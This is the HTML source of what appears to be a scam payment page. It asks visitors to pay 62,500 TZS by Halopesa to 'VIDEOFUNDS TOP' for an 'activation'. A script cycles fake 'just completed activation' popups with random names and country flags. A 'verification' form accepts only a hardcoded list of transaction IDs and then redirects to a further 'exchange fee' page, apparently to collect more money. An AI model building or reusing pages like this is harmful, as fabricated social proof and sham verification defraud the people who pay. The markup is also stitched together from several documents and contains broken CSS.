        <!DOCTYPE html>
        <html lang="en">

        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Welcome</title>
            <style>
                /* General Styles */

                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    background-color: #ff9900;
                }

                /* Welcome Container */

                .welcome-container {
                    text-align: center;
                    background:darkred;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    width: 80%;
                    margin: 20px auto;
                }

                h1 {
                    color: #333;
                }

                .image-container {
                    text-align: center;
                    margin-bottom: 20px;
                }

                .image-container img {
                    max-width: 100%;
                    height: auto;
                    border-radius: 8px;
                    margin-bottom: 10px;
                }

                .image-container p {
                    font-size: 16px;
                    color: #555;
                }

                a {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 10px 20px;
                    background-color: ;
                    color:darkred;
                    text-decoration: none;
                    border-radius: 5px;
                }

                a:hover {
                    background-color: ;
                }

                /* Card Container Styles */

                .card-container {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    /* Three columns for the cards */
                    gap: 20px;
                    padding: 20px;
                    margin-top: 20px;
                    margin-bottom: 40px;
                    /* Added margin-bottom for space before the footer */
                }

                .Div_card {
                    background-color: darkred;
                    border-radius: 15px;
                    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                    overflow: hidden;
                    padding: 20px;
                    transition: transform 0.3s ease;
                    color: white;
                    /* Make text inside the cards white */
                }

                .Div_card:hover {
                    transform: translateY(-10px);
                }

                .img4 img {
                    width: 100%;
                    border-radius: 15px;
                    margin-bottom: 15px;
                }

                .div_h {
                    font-size: 20px;
                    font-weight: bold;
                    margin-bottom: 15px;
                }

                .div_ol ol {
                    list-style-type: decimal;
                    padding-left: 20px;
                }

                .div_ol li {
                    font-size: 16px;
                    margin: 8px 0;
                    color: #fff;
                    /* Ensure list items are also white */
                }

                /* For smaller screens, stack the cards vertically */

                @media (max-width: 768px) {
                    .card-container {
                        grid-template-columns: 1fr;
                    }
                }

                /* Information Card Styles */

                .info-card {
                    background-color: black;
                    color: white;
                }

                /* Footer Styles */

                .footer {
                    background-color: #333;
                    color: white;
                    text-align: center;
                    padding: 20px 0;
                    /* Added more padding for better spacing */
                    position: relative;
                    bottom: 0;
                    width: 100%;
                }
            </style>
            </head>
                <body>


            <!-- Payment Instructions Section -->
            <h1 style="text-align: center;"></h1>

            <div class="card-container">
         
             <!-- Halotel Pesa Payment Instruction -->
                <div class="Div_card" style="background-color: #f57922;">
                    <header class="img4">
                        <img src="images/halopesa.png" alt="Halo Pesa">
                    </header>
                    <div class="div_h">HOW TO PAY THROUGH HALOPESA</div>
                    <div class="div_ol">
                        <ol type="1">
                            <li>DIAL *150*88#</li>
                            <li>CHOOSE: LIPA BIDHAA.</li>
                            <li>CHOOSE: PAY HALOTEL MERCHANT</li>
                            <li>ENTER  <b>23513043 </b> IT WILL SHOW NAME <b>(VIDEOFUNDS TOP )</b></li>
                            <li>ENTER AMOUNT62,500-/TSH TZS</li>
                            <li>Enter the PIN to authorize the transaction.</li>
                        </ol>
                    </div>
                </div>
                                      <!-- Notification HTML -->
<div id="notification" style="
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 9999;
    background-color: green;
    color: white;
    padding: 15px 20px;
    border-radius: 10px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    font-family: Arial, sans-serif;
    display: none;
    animation: fadeInOut 5s ease-in-out;
">
    <strong>Success!</strong><br>
    <span id="notification-text">Someone just activated!</span>
</div>

<!-- Animation Keyframes -->
<style>
@keyframes fadeInOut {
    0% {opacity: 0; transform: translateY(-20px);}
    10% {opacity: 1; transform: translateY(0);}
    90% {opacity: 1; transform: translateY(0);}
    100% {opacity: 0; transform: translateY(-20px);}
}
</style>
<script>
// Sample names and African country flags
const names = ["Juma", "Aisha", "Kwame", "Fatou", "Ahmed", "Blessing", "Chinedu", "Daniel", "Olivia", "Matthew",
            "Patrick", "Grace", "Brian", "Linda", "James", "Mary", "Robert", "Jennifer", "John", "Lisa",
            "William", "Elizabeth", "Joseph", "Susan", "Thomas", "Karen", "Charles", "Nancy", "Christopher", "Betty",
            "Anthony", "Margaret", "Mark", "Sandra", "Donald", "Ashley", "Steven", "Kimberly", "Paul", "Donna",
            "Andrew", "Dorothy", "Joshua", "Michelle", "Kenneth", "Carol", "Kevin", "Amanda", "Brian", "Melissa",
            "George", "Deborah", "Edward", "Stephanie", "Ronald", "Rebecca", "Timothy", "Zanele", "Ibrahim", "Musa"];
const flags = ["🇹🇿", "🇰🇪", "🇺🇬", "🇳🇬", "🇿🇦", "🇬🇭", "🇪🇹", "🇨🇲", "🇨🇮", "🇸🇳", "🇩🇿", "🇿🇼", "🇲🇦", "🇲🇼", "🇧🇮"];

function showNotification() {
    const name = names[Math.floor(Math.random() * names.length)];
    const flag = flags[Math.floor(Math.random() * flags.length)];
    const text = `${name} from ${flag} just completed activation!`;

    const notification = document.getElementById("notification");
    const notificationText = document.getElementById("notification-text");

    notificationText.textContent = text;
    notification.style.display = "block";

    // Restart animation
    notification.style.animation = "none";
    void notification.offsetWidth; // Force reflow
    notification.style.animation = "fadeInOut 5s ease-in-out";

    // Hide after 5s
    setTimeout(() => {
        notification.style.display = "none";
    }, 5000);
}

// Show notification every 8 seconds
setInterval(showNotification, 8000);
</script>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Email Us Button</title>
  <style>
    body {
      margin: 0;
      padding: 0;
    }

    .email-button {
      position: fixed;
      bottom: 500px;
      left: 250px;
      background-color: darkred;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      font-size: 16px;
      font-family: Arial, sans-serif;
      z-index: 1000;
      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }

    .email-button:hover {
      background-color: #a10000;
    }
  </style>
</head>
<body>

  <a href="mailto:officialvideofunds@gmail.com?subject=Support%20Request" class="email-button">
    I have Payed Please Confirm 
  </a>

</body>
</html>

<br>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Transaction Verification</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #ff9900;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #red;
      margin: 0;
      padding: 40px;
    }

    .container {
      max-width: 400px;
      margin: auto;
      background-color: darkred;
      padding: 20px;
      border-radius: 10px;
      border: 2px solid #f87171;
      box-shadow: 0 0 10px rgba(255,0,0,0.2);
    }

    .container {
      background-color: darkred;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: center;
    }

    h1 {
      color: white;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: white;
    }

    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #45a049;
    }

    .error, .success {
      margin-top: 10px;
      display: none;
    }

    .error {
      color: #f44336;
    }

    .success {
      color: #4CAF50;
    }

    .spinner {
      display: none;
      margin: 20px auto;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Transaction Verification</h1>
    <div class="input-group">
      <label for="transactionId">Enter Transaction ID:</label>
      <input type="text" id="transactionId" placeholder="e.g. CF61IEMQBVZ">
    </div>
    <button onclick="verifyTransaction()">Verify</button>
    <div class="spinner" id="loadingSpinner"></div>
    <p id="errorMessage" class="error">Invalid Transaction ID. Please try again.</p>
    <p id="successMessage" class="success">Transaction verified! Redirecting...</p>
  </div>

  <script>
    const validTransactionIds = [
               "TXN1CFB4IH6E4NC17",   
      "TXN9CFB4IH6E4NC16",
      "TXN1CFB4IH6E4NC1",
      "TXCFB4IH6E4NC123",
      "TXCFB4IH6E4NCN34564",
      "TCFB4IH6E4NC549873",
      "CFB4IH6E4NCK331",
      "TCFB4IH6E4NC89MMB1"
    ];
    function verifyTransaction() {
      const transactionId = document.getElementById('transactionId').value.trim();
      const errorElement = document.getElementById('errorMessage');
      const successElement = document.getElementById('successMessage');
      const spinner = document.getElementById('loadingSpinner');

      // Hide all messages and spinner
      errorElement.style.display = 'none';
      successElement.style.display = 'none';
      spinner.style.display = 'none';

      if (validTransactionIds.includes(transactionId)) {
        successElement.style.display = 'block';
        spinner.style.display = 'block';

        setTimeout(() => {
          window.location.href = "exchange fee/index exchange.html"; // Redirect to next page
        }, 2000); // 2 second delay
      } else {
        errorElement.style.display = 'block';
      }
    }
  </script>
</body>
</html>

